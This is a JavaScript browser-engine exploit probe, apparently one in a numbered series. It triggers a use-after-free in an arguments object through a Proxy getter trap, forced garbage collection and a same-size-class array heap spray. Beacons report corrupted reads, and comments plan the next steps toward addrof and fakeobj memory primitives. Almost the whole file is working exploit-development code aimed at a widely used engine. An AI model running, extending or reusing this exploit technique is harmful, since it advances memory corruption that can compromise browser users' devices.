// p246 - addrof via ClonedArguments UAF with CORRECT spray type
//
// ROOT CAUSE of p244/p245 failure:
// ArrayBuffer backing stores use FastMalloc/bmalloc (different pool).
// Butterfly cells use jsValueGigacageAuxiliarySpace (GC MarkedBlocks).
// ArrayBuffer spray can NEVER reclaim a freed butterfly.
//
// FIX: Spray with Array(69) whose butterflies are in the SAME pool.
// Array(69) butterfly = 8 + 69*8 = 560 bytes (same size class as victim ~552B)
//
// p221 used this and got CORRUPT-1. This probe adds controlled data
// for addrof extraction.
//
// Beacon prefix: V246-

(function() {
  function B(tag, body) {
    var url = '/beacon/V246-' + tag + '?t=' + Date.now();
    try {
      if (body) navigator.sendBeacon(url, String(body).substring(0, 900));
      else new Image().src = url;
    } catch(e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  B('BOOT');

  function target() { return arguments; }
  function reader() { return Array.prototype.slice.call(arguments); }

  // Phase 1: Calibrate - reproduce p221's CORRUPT-1 with controlled data
  function doStaleRead(round, targetObj) {
    var N = 64;
    var HOLE = 5;
    var argArr = [];
    for (var i = 0; i < N; i++) {
      if (i === 0) argArr.push(targetObj);  // target at slot 0
      else if (i === 1) argArr.push(targetObj); // and slot 1
      else if (i === 2) argArr.push(targetObj); // and slot 2
      else if (i === HOLE) argArr.push(i + 1);
      else argArr.push(i + 1); // integers
    }

    var args = target.apply(null, argArr);
    delete args[HOLE];

    var trapFired = false;
    var sprayArrs = [];

    var trap = {
      get: function(t, prop) {
        if (trapFired) return 0xFACE;
        trapFired = true;

        // Step 1: Massive growth -> different size class -> new alloc
        for (var j = 100; j < 1000; j++) {
          args[j] = 0x41414141;
        }

        // Step 2: Heavy GC (match p221: 800K objects)
        for (var g = 0; g < 50; g++) {
          var batch = [];
          for (var k = 0; k < 10000; k++) {
            batch.push({x: k, y: String(k)});
          }
          batch = null;
        }
        for (var g2 = 0; g2 < 30; g2++) {
          var batch2 = [];
          for (var k2 = 0; k2 < 10000; k2++) {
            batch2.push({a: k2});
          }
          batch2 = null;
        }

        // Step 3: Spray with Array(69) - SAME allocator pool as butterfly
        // Fill with known double pattern that encodes marker in raw bits
        // Array butterfly layout: [header:8][data[0]:8][data[1]:8]...[data[68]:8]
        // The old butterfly layout: [outOfLine:32][header:8][data[0]:8]...[data[63]:8]
        // old total = 32+8+512 = 552, size class ~560
        // Array(69) total = 8+552 = 560, same class!
        sprayArrs = [];
        var MARKER = 0xC0FE0000;
        for (var s = 0; s < 5000; s++) {
          var arr = new Array(69);
          for (var f = 0; f < 69; f++) {
            arr[f] = (MARKER | ((s * 69 + f) & 0xFFFF)) >>> 0;
          }
          sprayArrs.push(arr);
        }
        // Also adjacent sizes
        for (var s2 = 0; s2 < 500; s2++) {
          var a68 = new Array(68);
          for (var f2 = 0; f2 < 68; f2++) a68[f2] = (0xD0AD0000 | (s2 & 0xFFFF)) >>> 0;
          sprayArrs.push(a68);
          var a70 = new Array(70);
          for (var f3 = 0; f3 < 70; f3++) a70[f3] = (0xBEAD0000 | (s2 & 0xFFFF)) >>> 0;
          sprayArrs.push(a70);
        }

        B('R' + round + '-SPRAYED-' + sprayArrs.length);
        return 0xBEEF;
      }
    };

    Object.setPrototypeOf(args, new Proxy({}, trap));

    var result;
    try {
      result = reader.apply(null, args);
    } catch(e) {
      B('R' + round + '-APPLY-ERR-' + e.message.substring(0, 40));
      return null;
    }

    if (!result) { B('R' + round + '-NO-RESULT'); return null; }
    B('R' + round + '-LEN-' + result.length);

    // Analyze: check for spray markers or raw pointer bits
    var corruptCount = 0;
    var origCount = 0;
    var objCount = 0;
    var ptrVals = [];
    var markerVals = [];

    for (var i = 0; i < Math.min(result.length, N); i++) {
      var v = result[i];
      if (typeof v === 'object' && v === targetObj) {
        objCount++;
      } else if (typeof v === 'number') {
        var u = v >>> 0;
        var hi16 = (u >>> 16) & 0xFFFF;

        if (hi16 === 0xC0FE || hi16 === 0xD0AD || hi16 === 0xBEAD || hi16 === 0xBEEF || hi16 === 0xFACE) {
          corruptCount++;
          markerVals.push(i + '=' + hex(u));
        } else if (i >= 3 && i !== HOLE && v === (i + 1)) {
          origCount++;
        } else {
          // Unexpected value at slots 0-2 (where targetObj was)
          // Could be raw pointer bits read from spray data
          if (i <= 2) {
            // Read raw 64-bit representation
            var buf = new ArrayBuffer(8);
            var f64 = new Float64Array(buf);
            f64[0] = v;
            var dv = new DataView(buf);
            var hi32 = dv.getUint32(4, false);
            var lo32 = dv.getUint32(0, false);
            ptrVals.push(i + '=' + hex(hi32) + hex(lo32));
            corruptCount++;
          } else {
            corruptCount++;
            markerVals.push(i + '=?' + hex(u));
          }
        }
      } else if (typeof v === 'undefined') {
        if (i !== HOLE) B('R' + round + '-UNDEF-' + i);
      }
    }

    B('R' + round + '-C' + corruptCount + '-O' + origCount + '-OBJ' + objCount);

    if (markerVals.length > 0) {
      B('R' + round + '-MARKERS', markerVals.slice(0, 10).join(' '));
    }
    if (ptrVals.length > 0) {
      B('R' + round + '-PTRBITS', ptrVals.join(' '));
    }

    if (corruptCount > 0) {
      B('R' + round + '-UAF-HIT');

      // Detailed: dump first 20 result values for analysis
      var dump = [];
      for (var d = 0; d < Math.min(result.length, 20); d++) {
        var rv = result[d];
        if (typeof rv === 'number') {
          dump.push(d + ':' + hex(rv >>> 0));
        } else if (typeof rv === 'object') {
          dump.push(d + ':OBJ');
        } else {
          dump.push(d + ':' + typeof rv);
        }
      }
      B('R' + round + '-DUMP', dump.join(' '));
    }

    return {corrupt: corruptCount, markers: markerVals, ptrs: ptrVals};
  }

  // Phase 2: If we get stale reads, do addrof
  // Put a known object at slot 0. If spray replaces butterfly,
  // result[0] will be spray data (a uint32 marker).
  // But we WANT the OPPOSITE: we want to read targetObj's JSValue bits.
  //
  // Strategy: DON'T spray. Let the old butterfly stay intact.
  // copyToArguments reads data[0] = targetObj's JSValue from old butterfly.
  // This gives us the raw 64-bit JSValue encoding of targetObj as a number.
  //
  // But wait - if old butterfly is intact, result[0] = targetObj (still object).
  // We need type confusion. The spray changes the INTERPRETATION:
  // old data[0] had a JSValue encoding of targetObj (64-bit pointer)
  // spray data[0] has a different JSValue encoding (maybe a double)
  // If spray wins, we read spray data. If not, we read original.
  //
  // For addrof: we need spray to NOT win at slot 0 (where targetObj is).
  // We need the stale read to return the original JSValue of targetObj.
  // Then we need to interpret that JSValue as a double to get bits.
  //
  // But copyToArguments does: firstElementDest[i] = data[i].get()
  // .get() returns JSValue. If it's an object pointer, it becomes
  // a JS object reference. If it's a double, it becomes a number.
  // We can't get raw bits this way...
  //
  // UNLESS: the spray writes a DOUBLE JSValue at the position where
  // targetObj's pointer used to be. Then data[i].get() returns a double
  // whose raw bits happen to be whatever the spray wrote.
  // But that gives us spray data, not targetObj's address.
  //
  // REAL ADDROF APPROACH:
  // Spray arrays where slot 0 contains a TAGGED DOUBLE whose bit pattern
  // we recognize, AND slot N contains a REFERENCE to targetObj.
  // When spray wins, we read our tagged double at slot 0 (confirms spray)
  // AND the JSValue at slot N is targetObj (spray array stored it).
  // No - this still doesn't leak the address.
  //
  // ACTUAL WORKING ADDROF:
  // 1. Create spray arrays that store targetObj at a known index
  // 2. Also store doubles at other indices
  // 3. When stale read returns data from spray butterfly:
  //    - Slots with doubles → we read the doubles (known values)
  //    - Slot with targetObj → JSValue copied as-is → still object ref
  // This CONFIRMS spray hit but doesn't leak the address.
  //
  // THE REAL TECHNIQUE: Use the spray to create a type confusion.
  // If old butterfly[0] = targetObj (a JSValue with object tag + pointer)
  // and the spray writes OVER that with a different JSValue,
  // the stale read gets the spray value, not targetObj.
  // We want the stale read to get targetObj's RAW BITS.
  // That means: we want the spray to NOT overwrite slot 0.
  //
  // But we can't control which spray array lands there.
  //
  // SIMPLEST APPROACH: Once we have reliable spray hits (C0FE markers),
  // we can do fakeobj directly:
  // 1. Spray arrays with doubles whose raw bit pattern = target address
  // 2. Stale read returns that double → copyToArguments treats as JSValue
  // 3. JSValue with object-tag bits → JS sees it as an object at our address
  // = fakeobj without addrof!
  //
  // For now: just confirm reliable spray hits.

  var testObj = {test: 'ADDROF', pad: new Array(16).join('X')};
  var testArr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];

  var hits = [];
  for (var r = 0; r < 8; r++) {
    var t = r < 4 ? testObj : testArr;
    var res = doStaleRead(r, t);
    if (res && res.corrupt > 0) {
      hits.push(r);
      B('HIT-ROUND-' + r);
    }
  }

  B('TOTAL-HITS-' + hits.length);

  if (hits.length > 0) {
    B('UAF-SPRAY-CONFIRMED');
  } else {
    B('NO-HITS-ALL-ROUNDS');
  }

  B('DONE');
})();
